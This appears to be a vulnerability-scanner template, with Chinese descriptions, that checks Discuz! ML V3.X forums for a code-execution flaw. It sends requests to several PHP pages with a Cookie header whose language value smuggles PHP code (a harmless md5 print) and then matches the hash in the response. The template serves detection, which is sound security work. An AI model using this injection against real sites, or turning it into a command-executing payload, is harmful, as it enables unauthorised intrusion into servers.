id: Discuz-ece-language
info:
  name: Discuz ML! V3.X  include_once template 代码执行
  author:
  - 折跃
  description: |-
    Discuz! ML V3.X 代码执行漏洞
    Discuz!是一套通用的社区论坛软件系统。

    Discuz! ML V3.X 存在代码执行漏洞，攻击者可利用该漏洞执行系统命令。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://discuz.net/

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、验证请求内容，过滤恶意代码及各种绕过方式，如大小写、BASE64编码，限制提交。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==200
    - contains(body,'202cb962ac59075b964b07152d234b70')
  extractors:
  - name: tmpCookie
    type: regex
    regex:
    - httponly,(.*)language'
    group: 1
    part: body
    internal: true
  path:
  - '{{BaseURL}}/{{varPath}}'
  attack: batteringram
  method: GET
  payloads:
    varPath:
    - portal.php
    - forum.php
    - search.php
    - home.php
    - member.php
    - group.php
    - connect.php
    - plugin.php
  headers:
    Cookie: '{{tmpCookie}}language=en''.print_r(md5(''123'')).'';'
    Host: '{{Hostname}}'
  req-condition: true
  stop-at-first-match: true
variables:
  verify: '{{rand_text_alphanumeric(32,"")}}'
